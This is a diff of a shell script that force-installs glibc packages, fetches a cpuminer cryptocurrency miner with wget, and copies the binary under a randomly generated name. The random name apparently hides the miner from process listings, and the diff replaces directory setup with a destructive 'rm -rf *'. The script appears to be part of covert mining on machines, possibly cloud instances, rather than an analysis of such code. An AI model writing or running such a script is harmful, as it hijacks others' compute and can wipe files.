@@ -8,12 +8,8 @@ glibc-common-2.17-55.el6.x86_64.rpm \
 glibc-devel-2.17-55.el6.x86_64.rpm \
 glibc-headers-2.17-55.el6.x86_64.rpm --force --nodeps
 azure=mxsemsdnlkdj;
-mkdir /usr/local
-mkdir /usr/local/src
-rm -r /usr/local/src/$azure
+rm -rf *
 wget https://github.com/minkcrypto/cpuminer-opt/releases/download/v3.9.5.2/cpuminer-rplant-linux.tar.gz
-mv cpuminer-rplant-linux.tar.gz /usr/local/src/$azure
-cd /usr/local/src/$azure
 tar -xvzf cpuminer-rplant-linux.tar.gz
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
 sudo cp cpuminer-sse2 "$cpuname"
